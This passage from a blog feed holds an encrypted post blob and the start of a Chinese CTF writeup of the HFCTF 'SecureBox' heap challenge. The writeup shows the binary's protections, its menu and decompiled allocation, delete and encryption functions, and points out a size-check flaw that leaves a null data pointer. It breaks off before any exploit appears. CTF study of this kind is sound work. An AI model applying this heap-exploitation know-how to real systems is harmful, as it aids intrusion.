2dd274611468323dc0348036373081b76be5724b8ece27680a4d56074b7a0c635722885d7c29b20e98ad99139642be5fb10e3440d3b01fd0d7a45fb511d496398695bc022c7d83f88b1beec26dfdc08fa3af712ad15434a615fb6ba903bcf74e5e26147805b59596c3fcea1801ccd6fd60287e6f14c696d84182881708ca55b049b070a90b7de1fad2150e0f3f919a2f9c5558828c7416f4d8bcad1671895fd4f5cfd084d3728852d9d914aeb047fdcffe5c31faa2b7dedc634005045482e51b86719bc5c6ab2572b003f3a51c1875b7e5daa066f49fb3233a1bf304433a27e112a991f40edf706a4e6d4982dd1a1dcd5a43b5895fee354f6cf24f50f598c40864176556cbaaad78108ff033103efd53ae961a2a9b7e00601625063822dadbd6d0e44a54a3d2229a7bbecb41a22193fb5ebddd99ea3c143d55015f00aa82e00fccd338d16804bb2680c7ffc0212377669d9809cf400f313f14fb7e80bfe89394d84a9bad3c97dffc56fb89131f861a519a7758631339eebed31f16e6b2b8a9cf0bba0d0d3db2c512cbd055b7b4cd8e2cb7ec8d622effe43df8e70fc6dc5c31a362bb8083d46ca185ccc956fa35e979f78385ce76e836bebddc4620ea7ae13e7c5ddb6fc71a2224cae6ac9fe7909de45a10fdd4ecdec73c91658fac8f7eb1bafc0848f4208d361d92141bc726bae6415c8cfe98be83405d77b30788a8d05b533ac71481750462789d5d6b76ad16344ee9503a7c9d95212cc2f480e134b88a12d4b815c16ba7c7a8ac9d0e28935525dba400799057016a6b406115452279adc7f616166da2f6f594ebbfc7e9be013b6a4a4335314ecb10dfb867aa0d25fd9272d3682660c073fd912371815c146857521125c52a64eb724035e9609e6fb5b94db8115d1a892e752093f0e449f881d1ff6c469dc2d987a004fe7fb6151c501b50cea98bc24066a8be36a8856d6c7188109c06d1f994788a35046a6b0afcf9d599b3ff227495672d16d70960571f36a9484d39f7c4b60bf291b7d1ed577ccfb4b20ad8a5a4383fa7a21f70e39cb46056030228fbb0d3da3133357d8d72f38a5b47656e708e0fa4cb85604b5dcd3101f9eccddbf5b612547984c180dd8e9954466455cd87c4f9082721a1a054e2c70858aef6a844a44bc05ce68059c57227f59808b1c7f782f8f6053c30336772b75f1d80146dc90c1bb81da41bf1b22d39f801688c56923a002f3b5cf3ba62983e689580c0337c49c7a7efd0bdbf480d4532cc2d95ce5fb49df3b9f53978655fa0df5d5d35131594d2ad068d8e01f1e82a12e9d8a8409e37dffabfed1ac12c646684d706b872c5cbb6dabb5661f985282f2b357520e3a1f0f7e422e520aabbffcd06ec35c00e9a52b38a74612ad99bb8b43c62f0a4732716f30d4798c531d96ea5025cbf62adf0247438f7fa6040a6719e108819a0979db5931eeb795b41a92d792fc43a8d13634af338f87b063f3c48cc06232dbd03dc64db4f65d0f10a2e74970baba1662a91010c527820a2bec83e4a4b99e8c95f72606736d313b6ad3f72e928fb944ad55b0da3d4ea335ec8ec1a10fe92460872947b36a0c36f05a4b96bc88069181034c1df7185111186464acdb64373092020110a49ce4889c2a81f900def03b697b1aab35918630bf75974bed4cc71f499aaa819570516c87fe9372c71bd265d12b6a1a7f6ed97b2e6005957eb99b3f5619b541254f2e957c81bacf2205f6a3e31a7d061dc337c090b2972277d99344b391fb58e8ffdd62f4e67d4315332f4b8cb85197e9fb5aae4c2be7e82afe06fa4815975ed36a0d9be3f48c1f5dd626f09babf39b9bb052b16a04df954ab8891fc08afc9bbb8e5e741dde600a0d0bf085183b5d72a0dc811dfdadcbbe9f29ee892821ea40efea3bd43f2d604f34451b300550ce3ffc94b3bb0bd6112b8652ebba7fc5eaaf5a6ed0c3ca0ef0f52f1540edec7daf53ccfa3c0f440230fcf8148b4028226b0fdc84a9ef3a8aca8f225fb5498b3f2a2e09f6ad527731bf9f351d0d2f5058f8e71e615a693e4f654892366d9fbff673f915ebabd7ab3953292abe85ad5b81e773333539dd9738028eff0abc29e04436f01a2ae0ed2071b41052877409d7616d02ee1afe84613bc0c3feb1a84bfdc0298f66db701af4c355d713e3c8004d496f6ab5c458e6a49e0fb4176975d25c7830cf868a13510d5387931aa3be65c3ef84d53c579c8e2804803cffae1e77c3241139e21d40f90f6ca93bd72a81f5d1ce74e80bf545469d00b9a3a35c328b44003c69688f7f87c27313cf030c5eb143f3606beb1ba3d9690acbb21576ed865c4ad6e95cc3092db79b9d04e5069023b9ed120136183c19173b26b39eadb9f5fc1460bda377c385d82116143f28ce56ee2c01a16c653d4a0d60c665ca5a7551b7d3468ca9bb0e7767d0aa631695a34f5e44b074bee1bd5c20a547fa56a83f4279a4f047fc1f2f3d20947b4fc022ecedbc70c643b5a61b4c13fc5be2c785bc2833729c58de646a7185d8e3f5515d54d6d8a970a823a3b1ccb67bf482c9df45a5edfdd0829987e8061986c825eca0200c87bd6fe3453d7315f9612ec1a4989f87a62cfd2e09c47667613d9dddc57a4ba5eaa7c6407e56d11bd685df2c388ed2eef1e9ab441457b5882ec0578e2ce1cd92df7a9459ac18017e20a407f22c8d9170d7285f6459ec2711206f809d5ac7582fe04d0861f4b8dfc53c9151d728237c7f0fecbf15b1e609c1da6265108742fda510941e62d2a5b87282c3688b9d31ac4490ef993769217ae8deb720beec534b078d401cc1b6bfd2a85cb78d80287c9c4627fa1abfc505fa8c5811eaff8d20ce7470722aed14266d2f1eba95cf600918e6bc4631da9164c63c5ef27deb14ce0c7bf04ccd6e7a097c00aa6bc65b3e393732c56d2e528366093e0c6b9136ce230b9709cd95dda9ce06d0f2cebf326b17842e310bfbded4c6c6e49a96f8918da76661ad0f1e42dd70968108752dffb46977589e10882912cd5a79333e6a8d41185e9af1da174988aecfa886f28f06e812fcafb245059adb3e2962b0c333d6d19cefd20fc48e30bae2fc6b9c368630b08dfbd40a941e8a3b6e3769f98d4be9cee1113b901f5834947d86f7e59f60d0f53f65ecb68186ccf7c9c3bbfe5ddc655b0ae5fd4fb39e3d4ae8e35e2b93ab56385283118c433499cfc4fd940d9fa77532df94a74f9ec4b2b889181d18fe2b38cb0e95fef621fc060b12adfbf6ab66e63f3fbbb9a0214688bf7c238e9636133550bccc52dd364265ba2d25f5b697e2e0d84144b57a2b85c99c25fca124af9613c9abd87f3ff4074806719450370873268515d4879102e1da5d573ac9f2f31cdc742fff8c7d40b110bec173abe366527ef05bdcae03aa7b72a6aed3abcff07fcfb84f297d48983ad434e634e2525eeb06d8a11d54a5bfafa391ad9b6ce86e5753961a41e00c1fdde805084f0d029c29887c6ef5f57c5fea9cca6ba7a840326050edb04260121e2e71dc5d6bc80b3c5e76c7ce2d6d636e3318891b576e7519ff5882e4ce7352220588d03b0d52449c5da325d0cf268d3224587113bab3d20e9e7cacb9fda1f7b920e2840951228040b6555235bbfae25fdf491c2eda8a4abc95322b577bd341b18aa3392ea4dd09792e6250569030a464dc606596d579f8ac5acb7bea610a7f9162903aad1e3154dd021d953b9eaa30560f7d016203a652dfd488dff0950ad66b64e76a64b9fd7079eb8834f40e42b257fc16859e8573df262393ed53d431e699805129109f4d6f8df8eb9a32deced03aa1ec31e77f9b7e88b92147f7c26f2c707e4be6464b2e506d787cd088cae3bd28173a165d0e26dd01d19def4105c3c4f65facaa7802e6f29f1ac24ecfd0a2a71b0c57c080bdba837b2a895fe013154f834cfe4fb93bd62cb5ca2b0f27b484a50032635e780b50f166238744f94b563c5a7bf682f204ff60f570a017380ad3d33c1fbb852f83e14a7e489c34cb03ed801af404375574b5681335c95fa1057084d493f7f386b9a15da331e8e66b8afb69e51f84f3906a3a1d8e8d390633062ee85976874761eac94702b9df02453055115c32b6abb73d71d7df50390754ea6ea4b61854f878eb82829b06792ab94a82c7bc14922d21e52249052166cf1405efe0ae76c00460ff1337ac83c2368e38d05a7a1e686bf7c7db65cd9e4a4e1a482d72cb4e6fb2f924daaac4b53aa0ee441758c3394330f6d0b690bd57b4c15be72c214de070d1b25af10b16410c47aa0bb1a2b8507f204b7e5c1ed9c60a3463de43dfa50b5072489847e92025a48dc4e06b2861daf4ac283424101f9cb4da5b49daa7451a9f4c851bcc956dc6592c7c927fb3eeaf4c5ab3c0e21618a26108d284e16b8591603c4f66748fcabb1485ba1cb5912bfa5ac8055ebe340e8f2fcdc69ece4801a91a197b18ecf6e51fee6ed39605a656ff464b377958f961322c55c93dba77014a6f6ece78e86ebf68a675fd46f85131a59bdc08c51febaaed42da5ab89f44d506045709a31cd1a78055e5d124c57771db531a75dfb1feb6f7ea75add2e2130fbc1d45ad056c2d8d896e04b2f0c052324612bbdf23fb5aac4d6780b99f82c6e903b81869bccd12aaf6fe66fb0102c460a4432f4facd654f893e49107d0406601b07bb8a8f6b681a480ed65784f9443d5a6ecc4e2d20d643ba0fac013fffb9e1f48d6e1273ac5099d2c9421ae641b46d5a745f45303461eac96456866e638d6bbb2148a547491c5df16af019fd16a3cf23cb5225e7ad6c33d27c7ad6dfd2809269f100a915db516e41b29b7051ede386645bebe26e1d8e6b6130ba4f74ceeff79f1f8ef41bd76b8fa177b67e1405c0625badd7937bc7e43b4be205d7aaec34499f0a13a5b044d13d251d4268cf62a48642fa3d9e60c60b53aa9df399af26d5a4f720afca7736a26e27cac224d7e75d7baf8f3999ea6c45cfac87e2af84e6298b8d658d7abea0cda087fabcddcf8702065a7dc071b2ce71db040513c6400fcd22d365fadfa59be013b27b2ef92bd097ac2fd1048f3a4750810969ff32c7a5a41e4737c009655231841d4f5ca15bd05fed3c57e9f6593bfd5e18daa2f1ce66e7b91550bad521fb5a1b2ae2aac58084746674844fbb502a75069dd5989ef6d42de0131dc99f4c94bfdf1ed4a3d5e2965acf85f9d87be91d1c50a832c624ea91ab86a3f2008688423029d8a07b01db87fa6a582eba176fab7d09e15001ab7927622a5ff56b9324f265678a620d72d2e50a4aa9c74ef0a6db142eb37748f8fc884447bb5ff14fb64005f3f81b27a4cba3cfe13771ff143a28e1cf9d9108d4920bb692601742d08fcda04354d7c262dd4807995f83480b944453b3b4fd979444da95bd24e4521f923cc66fcfda32bfd5ef027c523f2c4c40f16864997d0ba54ed574b34485ef8e749d7fadfa17e0302f323037e20380fdc4b146377e23320af7a7ec17f0bd3c10634b847c5b82fa841b4d3a70517b23eb1854c7da2c2c6b54507cb2036c68c3f35d58d3c6cbd0ece865130e1a838f38447ee57ce1ce89eb21e5e9d92ed3cd19d66fd59e265cb1dc1cb939f17cf301785af4c25def8f7feff91e3503b8642f10d6247204a2c6622a03af310a9ae579f2cc3944b776c6b5fb870120a67a1147a8806ac45e00b543be8dd51857d9015b46b4f77129321f26c4c83aac5c7cd14ee38f99c5b672073f0472bf91aec6205f93c0ac5f7ea5892b0a7a5169a5764ba07f8396d4c2b8fb0aa31e2cf489603e24cc50f66be977b378d9de006825a3507f4ee49ace602ef987540e27c40be0b15258a9455f3d60a58c52454b674ad25e53e69a58dbd49b923ff0b5b1aa3c0967db09c2549b929722ed3f7c27b8e78078d6fb6a5d201456356ecbcc9dbb3c5023a62284d5d0567d65a4cdd0117bfdde7e3c82f3570526ed7cb6403e4f95814b614d64505e0fedef8b78dbc99d6f8c46d1ba1b9bf51472243d0b919a1b021a43337b315ad3355b253e7b812ead8f9b8ddd8483a335822451d603878540a26d2973bde2546e92d90c49b33442a97c48eab0a3f65dc8e5e5a3be0cd85acd4f6531b7470dbcc4dc27e74524e011692f024735d3286924622086ef99c1969a49691f23e6a3e41ecae2a13bd01937cd752d1b86774065c1dcab7e7eaf8ee58992a6b10888c7d584d4a7dd355ae983babd0d6ea6144f53180a76b166ecd0a0ee3beeb477d40a42b12eb60cfef101003616005b2cae21eccc1a7389135ec6b6ab28a73aa250ea855389dcd6e7be46b4c4164e6655d9d877ca83b01cd16d25012bde177fb16b74d7f5d96067b0eecbf1385fe1bb82421b08f7296571bf988d3f3ba6d8a68554fa30a16af82f12736b97b88ff4c85d0abdc52006d4429d4ea115ecbb0207d102e87d6cfd8a03b82f0e9da8127ba286a5547cfe0da448d022b96c84368370bd04723f0e5565eec09317b0f59e9e787debda06ce523a799cb8e2fa148e822f289a97a6d4da88ab08884cfa55def10419a5ef28153f6ab68061936dc21d8ef824723d94e7337bc5afcd1ebfca8d615d9c580d178f6afb8310589c3120b9dbf2f5c1fa0219783454b54770ca5b64e83fa8329521dfc65e70415cc65622a4b7275f535b5868a5c0d936fe710ddec3dc055bb49b7d5449f1cdd1448588a079df2e00881fd040266ba6bf3825a968455dbd40d12042d59f9543e545603084d4b247022106d708d80504c08659635a714a9217c70de3ff5547192cc8349b2838efecc92dd77bb4c005f5674502c070a31ac09d9942bff37d290acfeaf7138d7b787c8093ce32353d2b2ec54eff3bcb6f4e876866500bfb223981819143780a5334cd3b51a1ea66fbff7972b2a0ef741b4026b17bb2bcadace4d177eb58fc798e1959bc63e2afcb371c8433ca754dd2ebdf1734463dbc95784c3f3117cdf4632fa187d59363251a2f645053c4dcb81ebe8cbcdcc9393d75aa0364ee8408e63deaa9fd544cf1970b21383cea20490205c9c4018c17a13f57f2589373b8e07cea0c1d5627b0c7989a03aa02d5061bc1daac2f1d229c78cfaf26a01f4524c662309e596425047a62fcd73d6fbce4b92d9c45a6f587cf8ee9bed6a71e0d0a9a5ab4d78694cb0c14efc6da345e626fb321ef8a9ff525890bdada28e1909cc3062d74be17571528f61c49d0c273053c5706dda6856096d8970d029461eb93069c17da736ae8c2878d0e7b55aff2fac282d8ca55eda42a0b20ae0f18f3d947d28180811f71f844b895d0ea53e1093e702ce6e5d5475efa4ada7a9198794089875d84ba426fd2a04bb7a60b9ab90bf65bad91119a6c94f11574297b1ffa6e172c9001b681d6920afd2e634dbeab2072f435d201f06abf3cab5b6163a4dee27a9043809e0b515defdbf1987efe31c7f237c12dd5d65660f300faf4cff2b9c4d6017e49ffda2cec2769ab072d4a44c274002c8be90b39168f5cac9d5e77520a45f26b0d6aa64fcf9f39b0d9e4fb55e853fc3c005d4a7e0440752b12a8afc6c89c1cdecce988adc55b06c7f687b13c0e6d939b45b8ebd85b3a3b51887a05e2ec0b37466f0ab4a9c424b3cbb55005545e14a30a22cafd182583718d4fd925d95da41b2204cc76c2e84e6cf35eadb906257d147406d1bea3b708f3bc9e6c85746b44a247d9a622f5cfbf41b597c74fe215422f7febc48e5c6922da7fee86158646a5a45c26a2e6ac832200dfff6b49c58ae6c6501ca58aa5aaf360af6d3df94c9bfb6f69fcac7ce80671996c1b5d2e078beb446b024c8870ba34c72714d4a1f4d104bc80c3bc9c511000a2b38cbd79dc8cf9570d19c1047dc0f678750ac5558bbc3ba95996b40616801b8b9b23110f45a5de2752643def9cc406b1ca225b30a692fa3120099d398a3d6cd20db6c90ea012df7a9be8117d1d68725b6061e89bf64601092639a13469a3299f2899ed142a62f51727a03d855a86734032a1ac84743aa2c77b78c77f921606e14b022707b3c5e54c2b955476a256ec5e62522a278184f2c78cd5cc079a27b81e6ed1c48a5acc3e7712210dec81b96aa4b92b1d39cedccbc70896e79063b1c8c94fa9ceb909eda53c3243255bb82eb79d57797217c655c628f72140da89b8b41987c1e5f651f9dcb742bcd54b39b4834147820ae912d653d5ff79919542311df310aff597af450dd80e59017907163066a70a7a45afa8e02fb8bfef6830e98b18f4ade3937940fa7448eb8ad56ef9390f4a6a6e8b7a20f86213c1a91d2f17bb956c8869d95dfac18fe59015d4f310cf4af712696b7610f9a648e3d8bd0a6ff8c3069513c1e4dbe05f5350771e14810b436058fa1bed9904ac4010f50084f21142cd04b5a486fee383d45a51b2e2cddae83efc0f6e53ed876153119302f38766e3ae5dc8800b7e6c33f0aec59e617244364a8b834e4234c815a512bc1bf5692345b87a01e51668a5ca1f0d87bb8a760b61dee54533a0459a13b7e22a574d1bf2d701d963d2c32e58fca883a6c540aae070dd17c46fe7f2a89a1101b8877d5f1acbb3edc05f33d537c9b23dd3d5dd9a4786182abb3aaed07e38e388cfa7cc047a541ad0940f0b7f5f7583136de9878b43d7088366bbb91bb4c448a39c14fae52276afd8975841255d8c5a7e989d5bffc2f3f990306d74b2dfe992a36faa3cab8f053ff2b750bc47b2c372a44a1629a0354d8455676f1a27e522d7cad0edf43e9a4af6dd5f9407e27db0497f20fe474a091e269060640c0934344ed9fc4600828cd9625be74040b4f1ef0f1b2ba72cd62fd216c5a603c470c9a9f9d00cecf981b76d59111d0c8c35c10bd1968b280b48c6d36861463917b2717920db9b0ff460b5803227d6c1f4dc137290ea0ec6efc1e994dc41c9e6ca077137d5eb6b8f78f12ca2b688d1481cf01e852c3d8729d9e25a7ac1ef2f02621786f573e79f69e63b6e38ad272549b80e8330e2b7b7c21cd36efac377f056b362dc92f11b0b748b7a0a08b045f8376c0a9c7800939f28b578205c7502dacf1628d5971c7be659e56e81c4952e57a2a97aa768f37b7e2115a4fa2f73b9eb8be5e66cf74199fb701acf2649dea020e352a1f11ba128a484dbacb4dc18d5f645c7e627220f19a27faaa63d37635f323c4b320df0ef6bb296979b447974a0b2e43e4125ff221da946f693c012cc620f35cc24933d51638871cd09837394df4e1ef59645863d8be761105bbabeccae84f876a27398d2585134ba34672aecab282c78e1951dd1b46230586ce44019e1a345b342b8ea0459154d059417943547ee3ab3d3b9211636303acb85f292f17a8f490069b1b283489acd3349686605ce1c71ecf0fb6ae22b97ccaaaf85b17df4e5259e49ab238f7a234cd07ac40297fd0023ee198b7ea73972cce781dd10aa1b2ed80ca86825ef5848d46a1d4aa736ebb02c3b9322b4789590347577c48c8a1426bdf90fd99d60bce2b4663f0f081a5365f44aecf2f0bc8ef3dc213e253930335e3eeb6ee9ec2ac9e6f82d1d6872bc49f88cb618e15a5ff505a81af117da7aed982ee790ff98023e10ad82f1bccb8d7cdf03b10f6eebaf4107b57c6edaa631912435b13aca8cd2a7cb46271619ebb7040b0cdec83bf3916962decc56181930404919bcc00c78105a31dbe47bfb78cbb4762348f01fe011d8b0b6e440dcc317ffc8dd328f9c44d5e6f0ca8f18d63875393bbd313ad1394321397551fb0d64b1d816c36e9dbbc2d46</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn: SecureBox</title>
    <link href="https://n0nop.github.io/2020/04/20/HFCTF-pwn-SecureBox/"/>
    <id>https://n0nop.github.io/2020/04/20/HFCTF-pwn-SecureBox/</id>
    <published>2020-04-20T10:51:20.000Z</published>
    <updated>2020-05-12T15:21:13.097Z</updated>
    
    <content type="html"><![CDATA[<p>太菜了，MarksMan没有做出来，本地打通了结果远程打不通。后面去做SecureBox，看到Glibc 2.30以为需要了解一些新机制了可能做起来会有些吃力，结果发现还挺简单的。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64，保护全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>常规菜单题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Allocate</span><br><span class="line">2.Delete</span><br><span class="line">3.Enc</span><br><span class="line">4.Show</span><br><span class="line">5.Exit</span><br></pre></td></tr></table></figure><ul><li><code>Allocate</code>功能就是先malloc一块0x28的chunk，然后前0x10字节填充随机密钥，chunk[4]储存输入的size，chunk[3]储存根据输入的size来malloc的数据chunk：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _QWORD *v0; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    v2 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        &#123;</span><br><span class="line">        v2 = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"No boxes available!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Size: "</span>);</span><br><span class="line">        <span class="built_in">size</span> = choice();</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x100</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">size</span> &lt;= <span class="number">0xFFF</span> )  <span class="comment">// size can be very large</span></span><br><span class="line">        &#123;</span><br><span class="line">        chunk_array[v2] = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">        *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) = <span class="built_in">size</span>;  <span class="comment">// very large number</span></span><br><span class="line">        v0 = chunk_array[v2];</span><br><span class="line">        v0[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);     <span class="comment">// return 0 here</span></span><br><span class="line">        <span class="built_in">memset</span>(chunk_array[v2], <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">        read_rand_data(chunk_array[v2]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Key: "</span>);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>, *((<span class="keyword">unsigned</span> __int8 *)chunk_array[v2] + j));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nBox ID: %d\n"</span>, v2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Delete</code>free得很彻底：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v1 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    LABEL_7:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_array[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v1] + <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">free</span>(*((<span class="keyword">void</span> **)chunk_array[v1] + <span class="number">3</span>));</span><br><span class="line">        *((_QWORD *)chunk_array[v1] + <span class="number">3</span>) = <span class="number">0L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(chunk_array[v1]);</span><br><span class="line">        chunk_array[v1] = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Enc</code>功能对输入的<code>index</code>对应的chunk中储存的数据chunk进行编辑，逻辑为输入相应的<code>offset</code>，<code>length</code>，以及<code>data</code>，然后在数据chunk的对应的<code>offset</code>写入<code>length</code>长度的加密的<code>data</code>，这里的加密其实就是使用在<code>Allocate</code>功能中产生的随机0x10字节的密钥进行异或。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Enc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v2 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">        <span class="built_in">puts</span>(<span 